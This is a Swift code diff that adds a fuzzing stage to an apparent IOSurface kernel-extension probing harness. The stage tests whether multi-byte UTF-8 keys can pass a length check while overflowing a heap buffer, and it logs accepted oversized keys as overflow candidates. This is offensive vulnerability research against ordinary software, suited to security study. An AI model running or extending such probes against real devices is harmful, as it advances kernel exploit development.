@@ -5040,3 +5040,95 @@ func runIOSurfaceDepthProbe(log: FuzzLog, completion: @escaping () -> Void) {
         completion()
     }
 }
+
+// ── stage21: UTF-8 Key Size Confusion ────────────────────────────────────────
+// stage20 found: IOSurface rejects ASCII keys at length 262142 (= 256KB - 2).
+// Hypothesis: the kext checks CFStringGetLength() (Unicode codepoints) but
+// allocates based on UTF-8 byte count, or vice versa.
+//
+// Attack: feed keys made of multi-byte UTF-8 characters so that the codepoint
+// count passes the guard while the UTF-8 byte count exceeds it.
+//
+// 2-byte chars (e.g. U+00E9 "é"): codepoints = N, UTF-8 bytes = 2N
+// 3-byte chars (e.g. U+2603 "☃"): codepoints = N, UTF-8 bytes = 3N
+// 4-byte chars (e.g. U+1F4A5 "💥"): codepoints = N, UTF-8 bytes = 4N
+//
+// Key sizes tested (by codepoint count):
+//   A: codepoints = 262141/2 + 1 = 131071  → UTF-8 bytes = 262142  (at limit)
+//   B: codepoints = 131070                  → UTF-8 bytes = 262140  (just under)
+//   C: codepoints = 131072                  → UTF-8 bytes = 262144  (just over limit)
+//   D: codepoints = 262141                  → UTF-8 bytes = 524282  (2x overflow attempt)
+//   E: same tests with 3-byte chars
+//   F: same tests with 4-byte emoji chars
+//   G: mixed: 131070 ASCII + 1 two-byte char (total codepoints=131071, bytes=131072)
+// ─────────────────────────────────────────────────────────────────────────────
+private func _utf8ConfusionBody(surfRef: IOSurfaceRef, log: FuzzLog) {
+    func step(_ s: String) { log.append(s) }
+
+    let tinyVal: CFData = Data([0x41]) as CFData
+
+    func probe(_ label: String, _ key: String) {
+        let cpCount  = key.unicodeScalars.count
+        let utf8Len  = key.utf8.count
+        IOSurfaceSetValue(surfRef, key as CFString, tinyVal)
+        let rb  = IOSurfaceCopyValue(surfRef, key as CFString)
+        let ok  = rb != nil
+        if ok { IOSurfaceRemoveValue(surfRef, key as CFString) }
+        step("  \(label): cp=\(cpCount) utf8=\(utf8Len) \(ok ? "ok" : "REJ")")
+    }
+
+    // ── A/B/C/D: 2-byte UTF-8 chars (U+00E9 = é) ───────────────────────────
+    step("── 2-byte UTF-8 key confusion ──")
+    let c2 = "\u{00E9}"  // é — 2 UTF-8 bytes per codepoint
+    probe("cp=131070 bytes=262140", String(repeating: c2, count: 131070))
+    probe("cp=131071 bytes=262142", String(repeating: c2, count: 131071))
+    probe("cp=131072 bytes=262144", String(repeating: c2, count: 131072))
+    probe("cp=262141 bytes=524282", String(repeating: c2, count: 262141))
+
+    // ── E: 3-byte UTF-8 chars (U+2603 = snowman) ────────────────────────────
+    step("── 3-byte UTF-8 key confusion ──")
+    let c3 = "\u{2603}"  // ☃ — 3 UTF-8 bytes per codepoint
+    probe("cp=87380 bytes=262140", String(repeating: c3, count: 87380))
+    probe("cp=87381 bytes=262143", String(repeating: c3, count: 87381))
+    probe("cp=87382 bytes=262146", String(repeating: c3, count: 87382))
+    probe("cp=262141 bytes=786423", String(repeating: c3, count: 262141))
+
+    // ── F: 4-byte UTF-8 chars (U+1F4A5 = 💥) ────────────────────────────────
+    step("── 4-byte UTF-8 key confusion ──")
+    let c4 = "\u{1F4A5}"  // 💥 — 4 UTF-8 bytes per codepoint
+    probe("cp=65535 bytes=262140", String(repeating: c4, count: 65535))
+    probe("cp=65536 bytes=262144", String(repeating: c4, count: 65536))
+    probe("cp=262141 bytes=1048564", String(repeating: c4, count: 262141))
+
+    // ── G: mixed ASCII + 2-byte — codepoints same, bytes differ ────────────
+    step("── G: mixed ASCII+2byte (same codepoint count, different byte count) ──")
+    // 262141 codepoints, all ASCII → 262141 UTF-8 bytes (should be OK from stage20)
+    probe("all-ASCII cp=262141",   String(repeating: "A", count: 262141))
+    // 262141 codepoints, all 2-byte → 524282 UTF-8 bytes (same char count, 2x bytes)
+    probe("all-2byte cp=262141",   String(repeating: c2, count: 262141))
+    // 131071 ASCII + 131070 2-byte = 262141 codepoints, 393211 UTF-8 bytes
+    let mixed = String(repeating: "A", count: 131071) + String(repeating: c2, count: 131070)
+    probe("mixed cp=262141 bytes=393211", mixed)
+
+    step("── UTF-8 confusion test complete ──")
+    step("  REJ where cp < 262142 = kext checks UTF-8 bytes, not codepoints")
+    step("  ok where cp = 262141 but bytes >> 262142 = HEAP OVERFLOW CANDIDATE")
+}
+
+func runUTF8KeyConfusion(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── UTF-8 Key Size Confusion (stage21) ──")
+        guard let surf = IOSurface(properties: [
+            .width:           64,
+            .height:          64,
+            .pixelFormat:     0x42475241,
+            .bytesPerElement: 4,
+            .bytesPerRow:     256,
+        ]) else { step("X IOSurface alloc failed"); completion(); return }
+        let surfRef = surf as! IOSurfaceRef
+        step("ok IOSurface @ \(surfRef)")
+        _utf8ConfusionBody(surfRef: surfRef, log: log)
+        completion()
+    }
+}
